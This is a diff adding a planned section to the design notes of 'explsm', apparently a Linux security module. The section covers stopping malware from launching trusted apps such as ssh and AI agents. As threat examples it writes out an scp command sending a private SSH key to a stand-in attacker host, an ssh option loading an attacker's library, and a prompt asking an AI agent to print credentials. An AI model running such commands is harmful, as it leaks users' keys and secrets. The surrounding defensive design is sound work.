@@ -308,3 +308,123 @@ Each way around explsm above gets a smoke test that runs it as root and
 expects the denial: bind-mount over explsmd, `insmod` of an unsigned module,
 `dd` from the disk, a kprobe reading a file, `explsmctl unload` without a
 token, editing the policy.
+
+## 9. Who started the app
+
+Plan only; nothing here is implemented yet. Comes after section 8 stage 2.
+
+### The problem
+
+Identity is per exe, so whoever can start an owner app can use it. Malware
+doesn't have to get into the app; it runs it:
+
+- **The app run with the attacker's arguments.**
+  `scp ~/.ssh/id_ed25519 attacker:` is the real `scp` with the `ssh`
+  identity, and it sends the key away.
+- **Foreign code loaded by the app itself.**
+  `ssh -o PKCS11Provider=/tmp/evil.so` makes the real `ssh` load a library
+  the attacker chose, which then runs with the `ssh` identity.
+- **Apps that act on instructions.** `claude -p "print the credentials"`
+  does the exfiltration itself, on request.
+
+`docs/threat-model.md` covers code inside the app (plugins, `eval`), not
+someone else starting it. Add a limitation, "anyone who can start an owner
+app can use it", with these three cases.
+
+### 9.1 Only trusted code in an app
+
+`mmap_file` and `file_mprotect` hooks: an app process may map a file as
+executable only if the file can be changed by root alone, or belongs to the
+app (its exe, its protected folders). Covers `PKCS11Provider`,
+`SecurityKeyProvider`, Python and Node modules from user-writable paths, and
+backs up the loader-variable check. Anonymous executable memory (JITs) is
+left alone. The rule is per app (`code trusted` by default, `code any` to
+turn it off for apps that load plugins from the user's folders), so it can
+be rolled out in audit mode first.
+
+### 9.2 `started_by`
+
+The app gets its identity only when it was started by something the policy
+trusts; otherwise the process runs as no app.
+
+```
+app ssh {
+    exe "/usr/bin/ssh", "/usr/bin/scp"
+    owns "~/.ssh"
+    started_by @terminal, @desktop, backup
+}
+```
+
+- **The spawner, not the parent.** The kernel re-parents a process when its
+  parent exits (to `systemd --user`, a subreaper), so the parent at exec
+  time can be chosen by the attacker. `task_alloc` records the identity of
+  the task that forked the process in its task storage, and the check uses
+  that. It never changes.
+- **Identities, not names.** The spawner is an explsm identity (from its
+  exe, checked by the kernel), so `comm` and `argv[0]` don't matter.
+- **`@terminal` means typed in a shell.** Today `TF_TERMINAL` is inherited
+  by everything below a terminal, including `npm install`'s postinstall
+  scripts (ptyxis → bash → node → sh → scp). Add a flag that is cleared on
+  any exec below the terminal that is not a shell named in policy
+  (`shell "/usr/bin/bash", …`). `started_by @terminal` needs the flag, so a
+  chain of shells only is accepted.
+- **`@desktop`** is GNOME Shell (by exe) launching an app. Other programs
+  can't make it run arbitrary code since GNOME 41, but it launches what
+  `.desktop` files say, see 9.3.
+- **Launchers that start things on request are not trusted**, and the docs
+  say so: `systemd --user` (`systemd-run --user`, unit files in
+  `~/.config/systemd/user`), D-Bus activation
+  (`org.freedesktop.Application.Activate`), gnome-session (autostart),
+  gnome-terminal-server (opens a terminal for any caller), `xdg-open`,
+  `gio launch`. Naming one in `started_by` is a warning.
+- A failed `started_by` is logged (`dropped=started_by spawner=…`), and in
+  audit mode only reported, like the loader-variable checks.
+
+### 9.3 Protect what launches things
+
+`started_by` is only as good as what the trusted spawners run. Protected by
+default (owned by explsm's own `launch` owner, changed only by apps the
+policy grants, e.g. the desktop's settings and an editor the user names):
+
+- `~/.local/share/applications` (a `.desktop` file there overrides the
+  system one with the same name)
+- `~/.config/autostart`
+- `~/.config/systemd/user`
+- shell startup files: `~/.bashrc`, `~/.profile`, `~/.bash_profile`,
+  `~/.zshrc`, `~/.config/fish/` (a script that writes one makes the user's
+  own shell run its command)
+
+### 9.4 Ask at launch
+
+For apps with `started_by`, a launch that fails the check can be put to the
+user instead of failing silently. It can wait for the answer: explsmd marks
+the app's exes with fanotify `FAN_OPEN_EXEC_PERM` and holds the exec until
+the agent answers (timeout: deny). The prompt names the spawner and the
+command line. Answers: allow once, always allow this spawner, deny.
+
+### 9.5 Option rules (backstop)
+
+Per app, options that drop the identity when present in `argv`
+(`deny_args "-o PKCS11Provider*", "-I", "-F"` for ssh). Easy to get around
+with other spellings, so only for known code-loading or redirecting options,
+and documented as such. Reading `argv` needs `bprm->p` / the new mm's arg
+pages in `bprm_committed_creds`.
+
+### 9.6 Policy guidance
+
+- **ssh:** keep keys out of `ssh`/`scp`'s reach: `ssh-agent` owns
+  `~/.ssh/id_*`, `ssh`/`scp` get keys only through the agent, with
+  `ssh-add -c` (confirm each use) or a FIDO key (touch). explsm protects the
+  agent and its socket. Example policy in `packaging/`.
+- **Apps that act on instructions** (AI agents, shells, interpreters) lend
+  their identity to anyone who can start them. `started_by @terminal` stops
+  background malware, not a script the user ran in that terminal. Say so in
+  the README next to the `~/.claude` example.
+
+### Testing
+
+Smoke tests, each expecting the identity to be dropped (or the prompt):
+`scp` spawned by a script interpreter, by a double-forked orphan, by
+`systemd-run --user`; `ssh -o PKCS11Provider=/tmp/x.so`; a `.so` from
+`/tmp` loaded with `dlopen`; writing `~/.bashrc` and
+`~/.local/share/applications/*.desktop` from an unconfined process.
